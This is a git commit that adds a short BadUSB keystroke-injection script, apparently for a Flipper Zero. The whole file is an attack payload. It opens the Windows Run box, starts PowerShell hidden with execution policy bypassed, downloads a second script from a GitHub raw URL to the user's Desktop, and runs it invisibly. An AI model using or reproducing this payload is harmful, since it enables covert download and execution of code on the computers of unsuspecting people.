ebe9a1165457dccf2b399f0fc17a3638fd22cdad
CoolGermanGuy <88776295+CGGonGitHub@users.noreply.github.com>
2023-06-07 19:32:30 +0200

    Create script2.ps1

---
+++ BadUSB/PowerShellShit/script2.ps1
@@ -0,0 +1,9 @@
+GUI r
+DELAY 750
+STRING powershell -W Hidden -Exec Bypass -C wget "https://raw.githubusercontent.com/CGGonGitHub/FlipperStuff/main/BadUSB/PowerShellShit/script.ps1" -OutFile "%userprofile%\Desktop\script.ps1"
+ENTER
+DELAY 5000
+GUI r
+DELAY 750
+STRING powershell -W Hidden -Exec Bypass -C "%userprofile%\Desktop\script.ps1"
+ENTER
